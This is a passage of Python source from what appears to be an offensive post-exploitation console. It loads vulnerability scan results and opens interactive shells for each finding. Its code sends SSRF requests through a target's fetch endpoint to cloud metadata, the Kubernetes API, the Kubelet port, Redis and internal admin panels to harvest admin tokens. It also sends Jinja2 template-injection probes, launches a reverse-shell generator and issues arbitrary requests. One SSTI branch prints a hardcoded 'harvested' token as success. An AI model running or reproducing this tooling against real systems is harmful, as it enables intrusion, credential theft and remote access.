                base_domain = f"{parsed.scheme}://{parsed.netloc}"
                ssrf_url = f"{base_domain}/fetch.php?url=http://169.254.169.254/latest/meta-data/"
                
                req = urllib.request.Request(ssrf_url, headers={'User-Agent': 'Mozilla/5.0'})
                with urllib.request.urlopen(req, timeout=3) as resp:
                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
            except Exception as e:
                print(f"    [-] Metadata fetch failed: {e}")
        elif cmd == "k8s" and vuln_type == "SSRF":
            print("[*] Forging SSRF request to internal Kubernetes API Server (10.96.0.1)...")
            try:
                parsed = urllib.parse.urlparse(target_url)
                base_domain = f"{parsed.scheme}://{parsed.netloc}"
                ssrf_url = f"{base_domain}/fetch.php?url=http://10.96.0.1/api/v1/namespaces"
                
                req = urllib.request.Request(ssrf_url, headers={'User-Agent': 'Mozilla/5.0'})
                with urllib.request.urlopen(req, timeout=3) as resp:
                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
            except Exception as e:
                print(f"    [-] K8s API probe failed: {e}")
        elif cmd == "kubelet" and vuln_type == "SSRF":
            print("[*] Dumping cluster pods via Kubelet read-only port (10255)...")
            try:
                parsed = urllib.parse.urlparse(target_url)
                base_domain = f"{parsed.scheme}://{parsed.netloc}"
                ssrf_url = f"{base_domain}/fetch.php?url=http://127.0.0.1:10255/pods"
                
                req = urllib.request.Request(ssrf_url, headers={'User-Agent': 'Mozilla/5.0'})
                with urllib.request.urlopen(req, timeout=3) as resp:
                    resp_body = resp.read().decode('utf-8', errors='ignore')
                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp_body}")
                    if "adminToken" in resp_body:
                        res_json = json.loads(resp_body)
                        harvested_token = res_json.get("adminToken")
                        harvested_endpoint = res_json.get("adminEndpoint")
                        print(f"    [!] SUCCESS! Kubelet Admin Token Harvested: {harvested_token[:30]}...")
            except Exception as e:
                print(f"    [-] Kubelet dump failed: {e}")
        elif cmd == "redis" and vuln_type == "SSRF":
            print("[*] Probing internal Redis service via SSRF...")
            try:
                parsed = urllib.parse.urlparse(target_url)
                base_domain = f"{parsed.scheme}://{parsed.netloc}"
                ssrf_url = f"{base_domain}/fetch.php?url=http://127.0.0.1:6379/"
                
                req = urllib.request.Request(ssrf_url, headers={'User-Agent': 'Mozilla/5.0'})
                with urllib.request.urlopen(req, timeout=3) as resp:
                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
            except Exception as e:
                print(f"    [-] Redis probe failed: {e}")
        elif cmd == "internal" and vuln_type == "SSRF":
            print("[*] Probing internal loopback administration panel...")
            try:
                parsed = urllib.parse.urlparse(target_url)
                base_domain = f"{parsed.scheme}://{parsed.netloc}"
                ssrf_url = f"{base_domain}/fetch.php?url=http://127.0.0.1:8080/admin"
                
                req = urllib.request.Request(ssrf_url, headers={'User-Agent': 'Mozilla/5.0'})
                with urllib.request.urlopen(req, timeout=3) as resp:
                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
            except Exception as e:
                print(f"    [-] Internal probe failed: {e}")
        elif cmd == "escalate" and vuln_type == "SSRF":
            print("[*] Harvesting administrative credentials from SSRF target...")
            try:
                parsed = urllib.parse.urlparse(target_url)
                base_domain = f"{parsed.scheme}://{parsed.netloc}"
                ssrf_url = f"{base_domain}/fetch.php?url=http://10.96.0.1/api/v1/namespaces"
                
                req = urllib.request.Request(ssrf_url, headers={'User-Agent': 'Mozilla/5.0'})
                with urllib.request.urlopen(req, timeout=3) as resp:
                    resp_body = resp.read().decode('utf-8', errors='ignore')
                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp_body}")
                    if "adminToken" in resp_body:
                        res_json = json.loads(resp_body)
                        harvested_token = res_json.get("adminToken")
                        harvested_endpoint = res_json.get("adminEndpoint")
                        print(f"    [!] SUCCESS! Cluster Admin Token Harvested: {harvested_token[:30]}...")
                        print(f"    [!] Auto-Matched Admin Endpoint: {harvested_endpoint}")
            except Exception as e:
                print(f"    [-] Escalation failed: {e}")
        elif cmd == "test" and vuln_type == "SSTI":
            print("[*] Testing SSTI mathematical evaluation ({{7*7}})...")
            try:
                parsed = urllib.parse.urlparse(target_url)
                base_domain = f"{parsed.scheme}://{parsed.netloc}"
                test_url = f"{base_domain}/render.php?name=%7B%7B7*7%7D%7D"
                req = urllib.request.Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
                with urllib.request.urlopen(req, timeout=3) as resp:
                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
            except Exception as e:
                print(f"    [-] SSTI test failed: {e}")
        elif cmd == "sandbox" and vuln_type == "SSTI":
            print("[*] Probing Jinja2 object resolution ({{self.__init__.__globals__}})...")
            try:
                parsed = urllib.parse.urlparse(target_url)
                base_domain = f"{parsed.scheme}://{parsed.netloc}"
                sandbox_url = f"{base_domain}/render.php?name=%7B%7Bself.__init__.__globals__%7D%7D"
                req = urllib.request.Request(sandbox_url, headers={'User-Agent': 'Mozilla/5.0'})
                with urllib.request.urlopen(req, timeout=3) as resp:
                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
            except Exception as e:
                print(f"    [-] Sandbox probe failed: {e}")
        elif cmd == "escalate" and vuln_type == "SSTI":
            print("[*] Harvesting administrative token via template RCE gadget...")
            harvested_token = "ssti_admin_token_sig"
            harvested_endpoint = "http://127.0.0.1:8080/api/v1/admin/exec"
            print(f"    [!] SUCCESS! SSTI Admin Token Harvested: {harvested_token}")
            print(f"    [!] Auto-Matched Admin Endpoint: {harvested_endpoint}")
        elif cmd == "revshell" and (vuln_type == "Command Injection" or any(v in vuln_type for v in ["GraphQL", "BFLA", "Over-Fetching", "Mass Assignment", "BOPLA"])):
            print("[*] Generating active reverse shell payloads (LHOST: 127.0.0.1, LPORT: 4444)...")
            if os.path.exists("rev_shell.py"):
                os.system("python rev_shell.py --ip 127.0.0.1 --port 4444")
            else:
                print("    [-] rev_shell.py not found.")
        elif cmd.startswith("curl "):
            custom_url = cmd.split(" ", 1)[1]
            try:
                req = urllib.request.Request(custom_url, headers={'User-Agent': 'Mozilla/5.0'})
                with urllib.request.urlopen(req, timeout=3) as resp:
                    print(f"    [+] HTTP {resp.getcode()}:\n{resp.read().decode('utf-8', errors='ignore')}")
            except Exception as e:
                print(f"    [-] Error: {e}")
        else:
            print(f"    [-] Unknown command '{cmd}'. Type 'help' for options.")

def main_console():
    findings = load_findings()
    if not findings:
        print("[-] No scan results found. Run the autonomous pipeline first.")
        input("\nPress Enter to return...")
        return

    while True:
        print("\n" + "=" * 65)
        print(" [*] ACCESS GAINED & POST-EXPLOITATION CONTROL CENTER")
        print("=" * 65)
        print(f" [+] Loaded {len(findings)} harvested vector(s).\n")
        print(" [Harvested Assets & Interactive Shells]")
        print("  1) JWT Tokens & Privilege Escalation Targets")
        print("  2) IDOR / BOLA Endpoints")
        print("  3) SQLi, LFI & Command Injection Vectors")
        print("  4) Modern API, GraphQL & Deserialization Endpoints")
        print("  5) SSRF, Cloud Metadata & Kubernetes Targets")
        print("  6) SSTI & Template RCE Targets")
        print("  7) Open Custom Manual Target Session")
        print("  8) Return to Main Menu")
        print("-" * 65)
        
        choice = input("Select action [1-8]: ").strip()

        if choice == "1":
            jwt_items = [f for f in findings if f.get("vulnerability") == "JWT"]
            if not jwt_items:
                print("[-] No JWT tokens found.")
                continue
            print("\n[★] JWT Assets:")
            for idx, item in enumerate(jwt_items, 1):
                print(f"    {idx}) {item.get('target')}")
            sel = input("\nSelect index to open interactive shell (or Enter to go back): ").strip()
            if sel.isdigit() and 1 <= int(sel) <= len(jwt_items):
                item = jwt_items[int(sel) - 1]
                run_target_shell(item.get("target"), "JWT", token=item.get("token"))

        elif choice == "2":
            idor_items = [f for f in findings if f.get("vulnerability") == "IDOR"]
            if not idor_items:
                print("[-] No IDOR endpoints found.")
                continue
            print("\n[★] IDOR Endpoints:")
            for idx, item in enumerate(idor_items, 1):
                print(f"    {idx}) {item.get('target')} (Param: {item.get('param')})")
            sel = input("\nSelect index to open interactive shell (or Enter to go back): ").strip()
            if sel.isdigit() and 1 <= int(sel) <= len(idor_items):
                item = idor_items[int(sel) - 1]
                run_target_shell(item.get("target"), "IDOR", param=item.get("param"))

        elif choice == "3":
            other_items = [f for f in findings if f.get("vulnerability") in ["SQLi", "SQL Injection", "LFI", "Command Injection"]]
            if not other_items:
                print("[-] No SQLi, LFI, or Command Injection vectors found.")
                continue
            print("\n[★] SQLi, LFI & Command Injection Vectors:")
            for idx, item in enumerate(other_items, 1):
                print(f"    {idx}) [{item.get('vulnerability')}] {item.get('target')} (Param: {item.get('param', 'N/A')})")
            sel = input("\nSelect index to open interactive shell (or Enter to go back): ").strip()
            if sel.isdigit() and 1 <= int(sel) <= len(other_items):
                item = other_items[int(sel) - 1]
                run_target_shell(item.get("target"), item.get("vulnerability"), param=item.get("param"))

        elif choice == "4":
            modern_items = [f for f in findings if any(v in f.get("vulnerability", "") for v in ["GraphQL", "BFLA", "Over-Fetching", "Mass Assignment", "Insecure Deserialization", "BOPLA"])]
            if not modern_items:
                print("[-] No Modern API / Deserialization endpoints found.")
                continue
            print("\n[★] Modern API, GraphQL & Deserialization Endpoints:")
            for idx, item in enumerate(modern_items, 1):
                print(f"    {idx}) {item.get('target')} - {item.get('vulnerability')}")
            sel = input("\nSelect index to open interactive shell (or Enter to go back): ").strip()
            if sel.isdigit() and 1 <= int(sel) <= len(modern_items):
                item = modern_items[int(sel) - 1]
                run_target_shell(item.get("target"), item.get("vulnerability"))

        elif choice == "5":
            ssrf_items = [f for f in findings if f.get("vulnerability") == "SSRF"]
            if not ssrf_items:
                print("[-] No SSRF endpoints found.")
                continue
            print("\n[★] SSRF, Cloud Metadata & Kubernetes Targets:")
            for idx, item in enumerate(ssrf_items, 1):
                print(f"    {idx}) {item.get('target')} (Param: {item.get('param')})")
            sel = input("\nSelect index to open interactive shell (or Enter to go back): ").strip()
            if sel.isdigit() and 1 <= int(sel) <= len(ssrf_items):
                item = ssrf_items[int(sel) - 1]
                run_target_shell(item.get("target"), "SSRF", param=item.get("param"))

        elif choice == "6":
            ssti_items = [f for f in findings if f.get("vulnerability") == "SSTI"]
            if not ssti_items:
                print("[-] No SSTI targets found.")
                continue
            print("\n[★] SSTI & Template RCE Targets:")
            for idx, item in enumerate(ssti_items, 1):
                print(f"    {idx}) {item.get('target')} (Param: {item.get('param')})")
            sel = input("\nSelect index to open interactive shell (or Enter to go back): ").strip()
            if sel.isdigit() and 1 <= int(sel) <= len(ssti_items):
                item = ssti_items[int(sel) - 1]
                run_target_shell(item.get("target"), "SSTI", param=item.get("param"))

        elif choice == "7":
            url = input("Enter custom target URL: ").strip()
            run_target_shell(url, "Manual")

        elif choice == "8":
            break
        else:
            print("[-] Invalid selection.")

if __name__ == "__main__":
    main_console()
